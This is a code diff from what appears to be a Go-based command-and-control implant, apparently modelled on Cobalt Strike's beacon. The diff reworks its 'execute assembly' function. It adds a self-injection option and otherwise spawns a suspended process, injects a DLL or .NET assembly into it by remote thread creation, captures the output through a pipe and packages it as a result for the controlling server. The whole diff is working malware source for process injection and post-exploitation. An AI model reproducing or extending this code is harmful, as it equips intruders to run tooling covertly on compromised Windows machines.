@@ -8,6 +8,7 @@ import (
 	"fmt"
 	"github.com/Ne0nd0g/go-clr"
 	"golang.org/x/sys/windows"
+	"main/config"
 	"main/packet"
 	"net"
 	"strconv"
@@ -48,73 +49,70 @@ func WebDelivery(b []byte) {
 }
 
 func ExecAsm(b []byte, isDllX64 bool, ignoreToken bool) error {
-	//return execAsmInject(b, isDllX64, ignoreToken)
-	return execAsmGo(b)
+	return execAsmInject(b, isDllX64, ignoreToken)
+	//return execAsmGo(b)
 }
 
 func execAsmInject(b []byte, isDllX64 bool, ignoreToken bool) error {
 	// callBackType, sleepTime, offset, description, csharp, dll, err
 	callBackType, _, offset, _, csharp, dll, err := parseExecAsm(b)
-	procInfo := &windows.ProcessInformation{}
-	startupInfo := &windows.StartupInfo{
-		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
-		ShowWindow: 1,
-	}
-	var readPipe, writePipe windows.Handle
-	sa := windows.SecurityAttributes{
-		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
-		SecurityDescriptor: nil,
-		InheritHandle:      1, //true
-	}
-
-	// don't forget close handle, write pipe will be used in go func, so we should close it manually
-	err = windows.CreatePipe(&readPipe, &writePipe, &sa, 0)
-	if err != nil {
-		return errors.New(fmt.Sprintf("CreatePipe error: %s", err))
-	}
-	defer windows.CloseHandle(writePipe)
-	defer windows.CloseHandle(readPipe)
-	startupInfo.Flags = windows.STARTF_USESTDHANDLES
-	startupInfo.StdErr = writePipe
-	startupInfo.StdOutput = writePipe
-
-	err = spawnTempProcess(procInfo, startupInfo, isDllX64, ignoreToken)
-	defer windows.CloseHandle(procInfo.Process)
-	defer windows.CloseHandle(procInfo.Thread)
-	if err != nil {
+	if config.InjectSelf {
+		currentPid = windows.GetCurrentProcessId()
+		err = injectSelf(dll, offset, csharp)
+		if err != nil {
+			currentPid = 0
+		}
 		return err
+	} else {
+		procInfo := &windows.ProcessInformation{}
+		startupInfo := &windows.StartupInfo{
+			Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
+			ShowWindow: 1,
+		}
+		var readPipe, writePipe windows.Handle
+		sa := windows.SecurityAttributes{
+			Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
+			SecurityDescriptor: nil,
+			InheritHandle:      1, //true
+		}
+
+		err = windows.CreatePipe(&readPipe, &writePipe, &sa, 0)
+		if err != nil {
+			return errors.New(fmt.Sprintf("CreatePipe error: %s", err))
+		}
+		defer windows.CloseHandle(writePipe)
+		defer windows.CloseHandle(readPipe)
+		startupInfo.Flags = windows.STARTF_USESTDHANDLES
+		startupInfo.StdErr = writePipe
+		startupInfo.StdOutput = writePipe
+
+		err = spawnTempProcess(procInfo, startupInfo, isDllX64, ignoreToken)
+		defer windows.CloseHandle(procInfo.Process)
+		defer windows.CloseHandle(procInfo.Thread)
+		if err != nil {
+			return err
+		}
+
+		err = createRemoteThread(procInfo.Process, dll, offset, csharp)
+		if err != nil {
+			return err
+		}
+		// always set to 15000, this is to long
+		//time.Sleep(time.Millisecond * time.Duration(sleepTime))
+		buf := make([]byte, 1024)
+		var read windows.Overlapped
+		// document said bytesRead can't be none under win7
+		var bytesRead uint32
+		err = windows.ReadFile(readPipe, buf, &bytesRead, &read)
+		if err != nil {
+			ErrorMessage("error reading result")
+		}
+		finalPacket := packet.MakePacket(int(callBackType), buf[:bytesRead])
+		packet.PushResult(finalPacket)
+		windows.CloseHandle(writePipe)
+		windows.CloseHandle(readPipe)
+		return nil
 	}
-	// job handle is meaningless
-	//j := job{
-	//	jid:         jobCnt,
-	//	pid:         procInfo.ProcessId,
-	//	description: string(description),
-	//	pipeName:    "anonymous pipe",
-	//	sleepTime:   sleepTime,
-	//	stopCh:      make(chan bool, 1),
-	//}
-	//jobCnt++
-	//jobs = append(jobs, j)
-	err = createRemoteThread(procInfo.Process, dll, offset, csharp)
-	if err != nil {
-		return err
-	}
-	// always set to 15000, this is to long
-	//time.Sleep(time.Millisecond * time.Duration(sleepTime))
-	buf := make([]byte, 1024)
-	var read windows.Overlapped
-	// document said bytesRead can't be none under win7
-	var bytesRead uint32
-	err = windows.ReadFile(readPipe, buf, &bytesRead, &read)
-	if err != nil {
-		ErrorMessage("error reading result")
-	}
-	finalPacket := packet.MakePacket(int(callBackType), buf[:bytesRead])
-	packet.PushResult(finalPacket)
-	//removeJob(j.jid)
-	windows.CloseHandle(writePipe)
-	windows.CloseHandle(readPipe)
-	return nil
 }
 
 func execAsmGo(b []byte) error {
